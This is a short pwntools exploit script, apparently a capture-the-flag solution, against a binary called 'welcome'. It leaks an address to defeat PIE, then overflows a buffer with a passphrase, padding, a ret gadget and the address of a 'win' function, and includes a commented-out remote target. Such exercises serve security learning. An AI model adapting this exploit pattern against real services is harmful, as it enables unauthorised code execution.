#!/usr/bin/python2
from pwn import *

#p = remote("103.145.226.168", 2012)
p = process("./welcome")
elf = context.binary = ELF('./welcome')
ret_add = 0x000000000000070e

p.recvuntil(': ')
addr_leak = int(p.recvuntil('\n'), 16) 
elf.address = addr_leak - elf.sym['welcome'] 
print(hex(elf.address))
print(hex(elf.sym['win']))

payload = 'ARA2021\x00'
payload += 'A'*256
payload += p64(elf.address + ret_add) #biar addressnya sama
payload += p64(elf.sym['win']) #addressnya udah sama dengan elf address

p.sendline(payload)
p.interactive()